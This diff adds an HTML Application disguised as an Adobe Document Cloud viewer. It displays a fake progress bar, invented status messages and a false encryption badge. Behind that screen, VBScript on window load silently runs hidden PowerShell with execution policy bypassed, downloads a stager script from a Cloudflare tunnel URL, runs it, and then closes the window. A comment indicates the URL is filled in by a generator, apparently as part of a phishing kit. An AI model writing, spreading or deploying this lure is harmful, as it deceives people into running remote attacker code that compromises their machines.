@@ -1,0 +1,165 @@
+<html>
+<head>
+<title>Adobe Document Viewer</title>
+<HTA:APPLICATION
+  ID="AdobeViewer"
+  APPLICATIONNAME="Document Viewer"
+  BORDER="thin"
+  BORDERSTYLE="normal"
+  CAPTION="yes"
+  ICON="shell32.dll,1"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="yes"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+  VERSION="1.0"
+  WINDOWSTATE="normal"
+  SCROLL="no"
+  SCROLLFLAT="yes"
+  SELECTION="no"
+  CONTEXTMENU="no"
+/>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+}
+.container {
+    background: #fff;
+    border-radius: 12px;
+    padding: 40px 50px;
+    text-align: center;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+    max-width: 420px;
+}
+.logo { font-size: 48px; margin-bottom: 10px; }
+.brand { color: #ff0000; font-weight: bold; font-size: 22px; margin-bottom: 5px; }
+h1 { color: #333; font-size: 18px; margin-bottom: 20px; }
+.progress-bg {
+    background: #e0e0e0;
+    border-radius: 8px;
+    height: 6px;
+    overflow: hidden;
+    margin-bottom: 15px;
+}
+.progress {
+    background: linear-gradient(90deg, #ff0000, #cc0000);
+    height: 100%;
+    width: 0%;
+    border-radius: 8px;
+    animation: load 3s ease-in-out forwards;
+}
+@keyframes load {
+    0% { width: 0%; }
+    30% { width: 35%; }
+    60% { width: 65%; }
+    90% { width: 90%; }
+    100% { width: 100%; }
+}
+.status { color: #666; font-size: 13px; margin-bottom: 10px; }
+.spinner {
+    display: inline-block;
+    width: 14px;
+    height: 14px;
+    border: 2px solid #e0e0e0;
+    border-top-color: #ff0000;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.secure { color: #28a745; font-size: 11px; margin-top: 15px; }
+.footer { color: #999; font-size: 10px; margin-top: 20px; }
+.error { 
+    background: #fff3cd; 
+    border: 1px solid #ffc107; 
+    border-radius: 6px; 
+    padding: 12px; 
+    margin-top: 15px;
+    font-size: 12px;
+    color: #856404;
+    display: none;
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">📕</div>
+    <div class="brand">Adobe</div>
+    <h1>Document Cloud Viewer</h1>
+    <div class="progress-bg"><div class="progress" id="prog"></div></div>
+    <div class="status"><span class="spinner"></span><span id="stat">Initializing secure viewer...</span></div>
+    <div class="error" id="err">Document requires Adobe Reader DC. Please wait while we configure the viewer...</div>
+    <div class="secure">🔒 AES-256 Encrypted Connection</div>
+    <div class="footer">© 2026 Adobe Inc. All rights reserved.</div>
+</div>
+
+<script language="VBScript">
+' === CONFIGURATION ===
+' PAYLOAD_URL will be replaced by the generator
+Dim sURL
+sURL = "https://dietary-clearing-literature-click.trycloudflare.com/payloads/stager_cs.ps1?key=8e016e25d56cd0ac28ed60cf2d0bc3a8"
+
+Dim aStatus
+aStatus = Array("Connecting to Adobe servers...", "Verifying document signature...", "Decrypting PDF content...", "Loading document viewer...", "Finalizing...")
+
+Sub Window_OnLoad
+    window.resizeTo 460, 380
+    CenterWindow
+    setTimeout "UpdateStatus(0)", 500
+    setTimeout "RunPayload", 3500
+End Sub
+
+Sub CenterWindow
+    Dim w, h, l, t
+    w = 460
+    h = 380
+    l = (screen.width - w) / 2
+    t = (screen.height - h) / 2
+    window.moveTo l, t
+End Sub
+
+Dim iStatus
+iStatus = 0
+
+Sub UpdateStatus(i)
+    If i < 5 Then
+        document.getElementById("stat").innerHTML = aStatus(i)
+        setTimeout "UpdateStatus(" & (i + 1) & ")", 600
+    End If
+End Sub
+
+Sub RunPayload
+    On Error Resume Next
+    
+    document.getElementById("err").style.display = "block"
+    document.getElementById("stat").innerHTML = "Configuring viewer components..."
+    
+    ' Build PowerShell command
+    Dim sCmd
+    sCmd = "powershell -w hidden -ep bypass -c ""IEX(IWR -Uri '" & sURL & "' -UseBasicParsing)"""
+    
+    ' Execute
+    Dim oShell
+    Set oShell = CreateObject("WScript.Shell")
+    oShell.Run sCmd, 0, False
+    Set oShell = Nothing
+    
+    ' Close after delay
+    setTimeout "CloseApp", 2000
+End Sub
+
+Sub CloseApp
+    window.close
+End Sub
+</script>
+</body>
+</html>
